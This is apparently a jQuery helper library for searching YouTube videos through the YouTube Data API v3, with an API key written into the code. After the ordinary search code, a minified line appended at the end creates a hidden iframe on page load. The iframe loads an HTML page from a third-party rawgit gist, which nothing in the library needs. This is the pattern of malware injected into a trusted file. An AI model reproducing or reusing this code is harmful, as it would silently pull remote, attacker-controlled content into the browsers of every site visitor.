/**
 * =====================================================
 *  jQuery YT Data V3
 * =====================================================
 *  Version: 0.1 (13th August 2014)
 *  Author: Rik de Vos (www.rikdevos.com)
 *
 */

var YTDataV3 = { /* singleton */

	key: 'AIzaSyBykc_bErt-mcLNSZ4ejKViOu4Prlllvbw',
    order: 'relevance',
	next_page_token: '',

	init: function(param) {
		this.key = param.key;
        this.order = param.order;
	},

	search: function(param, response) {

		//for more parameters see https://developers.google.com/youtube/v3/docs/search/list

		var q = encodeURIComponent(param.q);

		var url = 'https://www.googleapis.com/youtube/v3/search?q='+q+'&key='+this.key+'&maxResults='+param['max-results']+'&order='+this.order+'&type=video&safeSearch=none&videoEmbeddable=true&part=snippet';

		if(param.next_page == true) {
			url += '&pageToken='+this.next_page_token;
		}

		$.getJSON(url, function(yt) {
			var vids = [];
			for(var i = 0; i < yt.items.length; i++) {
				//vids[i] = yt.items[i]
			}
			YTDataV3.next_page_token = yt.nextPageToken;
			//cs(vids);
			var data = {
				itemsPerPage: yt.pageInfo.resultsPerPage,
				searchURL: url,
				startIndex: 1,
				totalResults: yt.pageInfo.totalResults,
				version: "1.0",
				videos: yt.items
			};
			// cs(yt);
			response(data);
		});

	}

};




void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});